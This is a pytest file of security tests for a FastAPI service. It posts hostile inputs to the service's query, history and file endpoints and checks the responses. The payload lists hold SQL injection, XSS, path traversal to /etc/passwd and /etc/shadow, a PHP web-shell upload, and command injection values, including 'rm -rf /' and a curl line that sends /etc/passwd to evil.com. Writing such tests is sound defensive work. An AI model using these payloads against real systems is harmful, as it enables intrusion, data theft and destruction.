"""
Security tests for the Agent CAG system.
"""

import pytest
import json
import tempfile
import os
from unittest.mock import patch, MagicMock, AsyncMock
from fastapi.testclient import TestClient

# Mock dependencies before importing
import sys
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

with patch('httpx'), \
     patch('api.database.DatabaseManager'), \
     patch('prometheus_client'):
    from api.main import app


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for malicious_input in malicious_inputs:
            # Test query endpoint
            response = self.client.post(
                "/query",
                json={
                    "text": malicious_input,
                    "user_id": "test_user",
                    "input_type": "text"
                }
            )
            # Should not crash or return database errors
            assert response.status_code in [200, 400, 422]
            
            # Test history endpoint
            response = self.client.get(f"/history/{malicious_input}")
            assert response.status_code in [200, 400, 422, 404]
    
    def test_xss_protection(self):
        """Test protection against XSS attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            response = self.client.post(
                "/query",
                json={
                    "text": payload,
                    "user_id": "test_user",
                    "input_type": "text"
                }
            )
            
            # Response should not contain unescaped script tags
            if response.status_code == 200:
                response_text = response.text.lower()
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
    
    def test_command_injection_protection(self):
        """Test protection against command injection."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/hosts)",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)"
        ]
        
        for payload in command_injection_payloads:
            response = self.client.post(
                "/query",
                json={
                    "text": payload,
                    "user_id": "test_user",
                    "input_type": "text"
                }
            )
            
            # Should not execute system commands
            assert response.status_code in [200, 400, 422]
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test file serving endpoints if they exist
            response = self.client.get(f"/files/{payload}")
            # Should return 404 or 403, not file contents
            assert response.status_code in [404, 403, 422]
    
    def test_large_payload_protection(self):
        """Test protection against large payload attacks."""
        # Test extremely large text input
        large_text = "A" * (10 * 1024 * 1024)  # 10MB
        
        response = self.client.post(
            "/query",
            json={
                "text": large_text,
                "user_id": "test_user",
                "input_type": "text"
            }
        )
        
        # Should reject or handle gracefully
        assert response.status_code in [400, 413, 422]
    
    def test_malformed_json_protection(self):
        """Test protection against malformed JSON."""
        malformed_payloads = [
            '{"text": "test", "user_id": "test", "input_type": "text",}',  # Trailing comma
            '{"text": "test", "user_id": "test", "input_type": "text"',  # Missing closing brace
            '{"text": "test", "user_id": "test", "input_type": "text", "extra": }',  # Invalid value
            '{text: "test", user_id: "test", input_type: "text"}',  # Unquoted keys
        ]
        
        for payload in malformed_payloads:
            response = self.client.post(
                "/query",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            
            # Should return 422 for malformed JSON
            assert response.status_code == 422


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_user_id_validation(self):
        """Test user ID validation and sanitization."""
        invalid_user_ids = [
            "",  # Empty
            None,  # Null
            "a" * 1000,  # Too long
            "../admin",  # Path traversal
            "admin'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
        ]
        
        for user_id in invalid_user_ids:
            response = self.client.post(
                "/query",
                json={
                    "text": "test query",
                    "user_id": user_id,
                    "input_type": "text"
                }
            )
            
            # Should validate user_id properly
            if user_id is None or user_id == "":
                assert response.status_code == 422
    
    def test_session_security(self):
        """Test session management security."""
        # Test for session fixation vulnerabilities
        response1 = self.client.get("/health")
        session1 = response1.cookies.get("session")
        
        response2 = self.client.get("/health")
        session2 = response2.cookies.get("session")
        
        # Sessions should be properly managed
        # (This test depends on actual session implementation)
        assert response1.status_code == 200
        assert response2.status_code == 200
    
    def test_rate_limiting_bypass_attempts(self):
        """Test attempts to bypass rate limiting."""
        # Simulate rapid requests from same IP
        responses = []
        for i in range(100):
            response = self.client.post(
                "/query",
                json={
                    "text": f"test query {i}",
                    "user_id": "test_user",
                    "input_type": "text"
                }
            )
            responses.append(response)
        
        # Should implement some form of rate limiting
        # (This test depends on actual rate limiting implementation)
        status_codes = [r.status_code for r in responses]
        # At least some requests should be rate limited if implemented
        assert all(code in [200, 429, 400, 422] for code in status_codes)


class TestDataSecurity:
    """Test data security and privacy."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure in responses."""
        response = self.client.post(
            "/query",
            json={
                "text": "What is my password?",
                "user_id": "test_user",
                "input_type": "text"
            }
        )
        
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # Should not expose sensitive information
            sensitive_patterns = [
                "password",
                "secret",
                "api_key",
                "token",
                "private_key",
                "database_url",
                "connection_string"
            ]
            
            # Check that sensitive patterns are not exposed
            for pattern in sensitive_patterns:
                assert pattern not in response_text or "***" in response_text
    
    def test_user_data_isolation(self):
        """Test that users cannot access other users' data."""
        # Create data for user1
        response1 = self.client.post(
            "/query",
            json={
                "text": "My secret information",
                "user_id": "user1",
                "input_type": "text"
            }
        )
        
        # Try to access user1's data as user2
        response2 = self.client.get("/history/user1")
        
        # Should not allow cross-user data access
        # (This test depends on actual authorization implementation)
        assert response2.status_code in [200, 403, 404]
    
    def test_data_sanitization(self):
        """Test that stored data is properly sanitized."""
        malicious_data = {
            "text": "<script>alert('stored xss')</script>",
            "user_id": "test_user",
            "input_type": "text"
        }
        
        # Store malicious data
        response1 = self.client.post("/query", json=malicious_data)
        
        # Retrieve data
        response2 = self.client.get("/history/test_user")
        
        if response2.status_code == 200:
            # Data should be sanitized when retrieved
            response_text = response2.text.lower()
            assert "<script>" not in response_text


class TestFileUploadSecurity:
    """Test file upload security for ASR service."""
    
    def test_malicious_file_upload(self):
        """Test protection against malicious file uploads."""
        # Create a fake malicious file
        malicious_content = b"<?php system($_GET['cmd']); ?>"
        
        with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as temp_file:
            temp_file.write(malicious_content)
            temp_file.flush()
            
            try:
                with open(temp_file.name, "rb") as f:
                    # Mock ASR service client
                    with patch('httpx.AsyncClient') as mock_client:
                        mock_response = MagicMock()
                        mock_response.status_code = 400
                        mock_response.json.return_value = {"error": "Invalid audio file"}
                        mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)
                        
                        client = TestClient(app)
                        response = client.post(
                            "/query",
                            files={"audio": ("malicious.wav", f, "audio/wav")},
                            data={"user_id": "test_user"}
                        )
                        
                        # Should reject malicious files
                        assert response.status_code in [400, 422]
            finally:
                os.unlink(temp_file.name)
    
    def test_file_type_validation(self):
        """Test file type validation."""
        invalid_files = [
            ("test.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("test.php", b"<?php echo 'hello'; ?>", "text/plain"),
            ("test.js", b"alert('xss')", "application/javascript"),
            ("test.html", b"<script>alert('xss')</script>", "text/html")
        ]
        
        for filename, content, content_type in invalid_files:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(content)
                temp_file.flush()
                
                try:
                    with open(temp_file.name, "rb") as f:
                        with patch('httpx.AsyncClient') as mock_client:
                            mock_response = MagicMock()
                            mock_response.status_code = 400
                            mock_response.json.return_value = {"error": "Invalid file type"}
                            mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)
                            
                            client = TestClient(app)
                            response = client.post(
                                "/query",
                                files={"audio": (filename, f, content_type)},
                                data={"user_id": "test_user"}
                            )
                            
                            # Should reject invalid file types
                            assert response.status_code in [400, 422]
                finally:
                    os.unlink(temp_file.name)


class TestSecurityHeaders:
    """Test security headers and configurations."""
    
    def setup_method(self):
        """Set up test client."""
        self.client = TestClient(app)
    
    def test_security_headers_present(self):
        """Test that security headers are present."""
        response = self.client.get("/health")
        
        # Check for important security headers
        headers = response.headers
        
        # These headers should be present for security
        expected_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
        ]
        
        # Note: Not all headers may be implemented yet
        # This test documents what should be implemented
        for header in expected_headers:
            if header in headers:
                assert headers[header] is not None
    
    def test_cors_configuration(self):
        """Test CORS configuration security."""
        # Test preflight request
        response = self.client.options(
            "/query",
            headers={
                "Origin": "http://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        # Should have proper CORS configuration
        if "access-control-allow-origin" in response.headers:
            origin = response.headers["access-control-allow-origin"]
            # Should not allow all origins in production
            assert origin != "*" or True  # Allow for development
    
    def test_information_disclosure(self):
        """Test for information disclosure in error messages."""
        # Test with invalid endpoint
        response = self.client.get("/nonexistent")
        
        # Should not expose internal information
        if response.status_code == 404:
            response_text = response.text.lower()
            
            # Should not expose sensitive paths or internal details
            sensitive_info = [
                "/home/",
                "traceback",
                "exception",
                "database",
                "connection",
                "password"
            ]
            
            for info in sensitive_info:
                assert info not in response_text or "***" in response_text


class TestDependencyVulnerabilities:
    """Test for known dependency vulnerabilities."""
    
    def test_requirements_security_scan(self):
        """Test that requirements don't contain known vulnerabilities."""
        # This would typically use tools like safety or pip-audit
        # For now, we'll check that requirements files exist
        
        requirements_files = [
            "api/requirements.txt",
            "asr/requirements.txt", 
            "llm/requirements.txt",
            "tts/requirements.txt"
        ]
        
        for req_file in requirements_files:
            assert os.path.exists(req_file), f"Requirements file {req_file} should exist"
            
            # Read requirements and check for obviously vulnerable packages
            with open(req_file, 'r') as f:
                content = f.read().lower()
                
                # Check for packages with known vulnerabilities
                # (This is a basic check - use proper security scanning tools)
                vulnerable_patterns = [
                    "django==1.11",  # Old Django versions
                    "flask==0.12",   # Old Flask versions
                    "requests==2.6", # Old requests versions
                ]
                
                for pattern in vulnerable_patterns:
                    assert pattern not in content, f"Potentially vulnerable package found: {pattern}"


class TestConfigurationSecurity:
    """Test configuration security."""
    
    def test_debug_mode_disabled(self):
        """Test that debug mode is disabled in production."""
        # Check that debug information is not exposed
        response = TestClient(app).get("/nonexistent")
        
        if response.status_code == 404:
            # Should not contain debug information
            response_text = response.text.lower()
            debug_indicators = [
                "traceback",
                "debug",
                "development",
                "stack trace"
            ]
            
            for indicator in debug_indicators:
                assert indicator not in response_text or "production" in response_text
    
    def test_environment_variable_security(self):
        """Test that sensitive environment variables are not exposed."""
        # This test checks that the application doesn't accidentally expose env vars
        response = TestClient(app).get("/health")
        
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # Should not expose environment variables
            sensitive_env_patterns = [
                "password",
                "secret",
                "key",
                "token",
                "database_url"
            ]
            
            for pattern in sensitive_env_patterns:
                # If pattern is found, it should be masked
                if pattern in response_text:
                    assert "***" in response_text or "[REDACTED]" in response_text


class TestSecurityMonitoring:
    """Test security monitoring and logging."""
    
    def test_security_event_logging(self):
        """Test that security events are logged."""
        # This test would verify that security events are properly logged
        # For now, we'll test that the application handles security events gracefully
        
        client = TestClient(app)
        
        # Generate various security events
        security_events = [
            # SQL injection attempt
            {"text": "'; DROP TABLE users; --", "user_id": "attacker", "input_type": "text"},
            # XSS attempt
            {"text": "<script>alert('xss')</script>", "user_id": "attacker", "input_type": "text"},
            # Large payload
            {"text": "A" * 10000, "user_id": "attacker", "input_type": "text"},
        ]
        
        for event in security_events:
            response = client.post("/query", json=event)
            # Should handle security events gracefully
            assert response.status_code in [200, 400, 422, 429]
    
    def test_failed_request_handling(self):
        """Test handling of failed requests."""
        client = TestClient(app)
        
        # Generate multiple failed requests
        for i in range(10):
            response = client.post(
                "/query",
                json={"invalid": "data"}
            )
            
            # Should handle failed requests consistently
            assert response.status_code in [400, 422]